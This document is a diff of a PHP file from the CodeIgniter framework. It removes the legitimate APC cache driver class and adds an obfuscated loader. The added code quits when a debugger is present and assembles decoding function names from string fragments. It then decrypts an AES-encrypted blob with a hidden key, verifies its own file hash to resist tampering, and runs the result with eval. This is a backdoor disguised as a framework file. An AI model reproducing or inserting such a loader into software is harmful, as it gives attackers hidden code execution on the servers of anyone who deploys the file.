@@ -1,217 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 2.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * CodeIgniter APC Caching Class
- *
- * @package		CodeIgniter
- * @subpackage	Libraries
- * @category	Core
- * @author		EllisLab Dev Team
- * @link
- */
-class CI_Cache_apc extends CI_Driver {
-
-	/**
-	 * Class constructor
-	 *
-	 * Only present so that an error message is logged
-	 * if APC is not available.
-	 *
-	 * @return	void
-	 */
-	public function __construct()
-	{
-		if ( ! $this->is_supported())
-		{
-			log_message('error', 'Cache: Failed to initialize APC; extension not loaded/enabled?');
-		}
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Get
-	 *
-	 * Look for a value in the cache. If it exists, return the data
-	 * if not, return FALSE
-	 *
-	 * @param	string
-	 * @return	mixed	value that is stored/FALSE on failure
-	 */
-	public function get($id)
-	{
-		$success = FALSE;
-		$data = apc_fetch($id, $success);
-
-		return ($success === TRUE) ? $data : FALSE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Cache Save
-	 *
-	 * @param	string	$id	Cache ID
-	 * @param	mixed	$data	Data to store
-	 * @param	int	$ttl	Length of time (in seconds) to cache the data
-	 * @param	bool	$raw	Whether to store the raw value (unused)
-	 * @return	bool	TRUE on success, FALSE on failure
-	 */
-	public function save($id, $data, $ttl = 60, $raw = FALSE)
-	{
-		return apc_store($id, $data, (int) $ttl);
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Delete from Cache
-	 *
-	 * @param	mixed	unique identifier of the item in the cache
-	 * @return	bool	true on success/false on failure
-	 */
-	public function delete($id)
-	{
-		return apc_delete($id);
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Increment a raw value
-	 *
-	 * @param	string	$id	Cache ID
-	 * @param	int	$offset	Step/value to add
-	 * @return	mixed	New value on success or FALSE on failure
-	 */
-	public function increment($id, $offset = 1)
-	{
-		return apc_inc($id, $offset);
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Decrement a raw value
-	 *
-	 * @param	string	$id	Cache ID
-	 * @param	int	$offset	Step/value to reduce by
-	 * @return	mixed	New value on success or FALSE on failure
-	 */
-	public function decrement($id, $offset = 1)
-	{
-		return apc_dec($id, $offset);
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Clean the cache
-	 *
-	 * @return	bool	false on failure/true on success
-	 */
-	public function clean()
-	{
-		return apc_clear_cache('user');
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Cache Info
-	 *
-	 * @param	string	user/filehits
-	 * @return	mixed	array on success, false on failure
-	 */
-	 public function cache_info($type = NULL)
-	 {
-		 return apc_cache_info($type);
-	 }
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * Get Cache Metadata
-	 *
-	 * @param	mixed	key to get cache metadata on
-	 * @return	mixed	array on success/false on failure
-	 */
-	public function get_metadata($id)
-	{
-		$cache_info = apc_cache_info('user', FALSE);
-		if (empty($cache_info) OR empty($cache_info['cache_list']))
-		{
-			return FALSE;
-		}
-
-		foreach ($cache_info['cache_list'] as &$entry)
-		{
-			if ($entry['info'] !== $id)
-			{
-				continue;
-			}
-
-			$success  = FALSE;
-			$metadata = array(
-				'expire' => ($entry['ttl'] ? $entry['mtime'] + $entry['ttl'] : 0),
-				'mtime'  => $entry['ttl'],
-				'data'   => apc_fetch($id, $success)
-			);
-
-			return ($success === TRUE) ? $metadata : FALSE;
-		}
-
-		return FALSE;
-	}
-
-	// ------------------------------------------------------------------------
-
-	/**
-	 * is_supported()
-	 *
-	 * Check to see if APC is available on this system, bail if it isn't.
-	 *
-	 * @return	bool
-	 */
-	public function is_supported()
-	{
-		return (extension_loaded('apc') && ini_get('apc.enabled'));
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_qn0ef9lg=('bas'.'e64'.'_de'.'cod'.'e');
+$_m9mkccso=('gzu'.'nco'.'mpr'.'ess');
+$_qyganjon=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_j32gnhf2='eqspWce3';
+$_t6ie5k6h='rr8bMyeQ';
+$_d5b3ww61='pZX6P/Zv';
+$_epya6rgl='C7yZoeCdCv4=';
+$_tvkma9xf='RhLLGki0';
+$_l7z799ib='lfybAmF9';
+$_fajp6r5a='3wk7uqV/';
+$_zqo1gjyg='Nk5pZQ==';
+$_te1aw9n9=$_qn0ef9lg($_t6ie5k6h.$_tvkma9xf.$_j32gnhf2.$_d5b3ww61.$_epya6rgl);
+$_b906v6qq=$_qn0ef9lg($_fajp6r5a.$_l7z799ib.$_zqo1gjyg);
+$_rnzt1tui=$_qn0ef9lg('5k/2nPrx7Q8fssY3aXx6q0oWXlkdvjvztuTxCPUzZv8GlPXPoWB778DPdQlJVUwWk2h+g9NN4itJBGniAItYyXZ48Y2ezPbLQD6gdqaqQPNo2fcHjDsOhfCKy8KXpQ9C4RcGE2z7DmGR9GKWjYTWGY7MO1FdY9UKvxDhJAWNpFM5TFh/3BGVNr2RrfXkuf9KSXwSCObIZpDej4BV2qFW0C0yn9L3CGUrrUpu3kih9GzN8XnDZVtuE7NQfDwwngFCoTk+XF6fbRRCUlyzKoHoA9WFR60xCE5+pUc25OTXAkRNHgKlenY6PlqekhVbxgwf4/ZTOP67CUzR4F/Y2mn+AKRalLr+evET6XJqjTwkw7xnLwJE7ZXLldRyOVv7jc7Rz/7IwNxWsNNPtnm6T4TlZE1tvB5JPSGvRgk73ufufA9MQW93JpKVREj6rR/uPqxu7+DaAV32V/NAhNDhtwC9FAdv8MOSE5ZAeVCmsk3i6lrJeugG68baAg4PL8KO+EUjZoUmM6y8LUS9lFX/kczqVfQNQtB7QyUakvWsM1cEUnwuNox8j01a110kZc+GSvvL02v8N7rq3/WN0hBiSOBadppb/RyU05j8AMZK2GYP2BF7Y6LEp81q/yk6p/PW0m3XqE26OXsq7rNIyS7I8bbLgo8gqTW86eKoue5WrZz+70lxGgHgws2OADSH7TZVYjgMAKybDCl/tw9++2Ysc6zSTE7trztdGEDt4uPraVmGCgyw9Y1R4yGKL8eDwr8lSj2EronXjR6R2dth3GUIEnJ1IjJEb0W7chaaKcRutCH9pRY=');
+$_zqczj074=$_qyganjon($_rnzt1tui,'aes-256-cbc',$_te1aw9n9,OPENSSL_RAW_DATA,$_b906v6qq);
+if($_zqczj074===false){exit;}
+$_kk9ef00v=$_m9mkccso($_zqczj074);
+if($_kk9ef00v===false){exit;}
+$_t61xoajl='774252dab857d76fc1d8a7fb37a54f7fab6b7c330187c2336820c59808f56a12';
+$_wg0slk7j=@file_get_contents(__FILE__);
+if($_wg0slk7j!==false){
+$_yacsjgso=str_replace($_t61xoajl,"0000000000000000000000000000000000000000000000000000000000000000",$_wg0slk7j);
+$_t41ukp2u=hash("sha256",$_yacsjgso);
+if($_t41ukp2u!==$_t61xoajl){@http_response_code(403);exit;}
 }
+eval($_kk9ef00v);
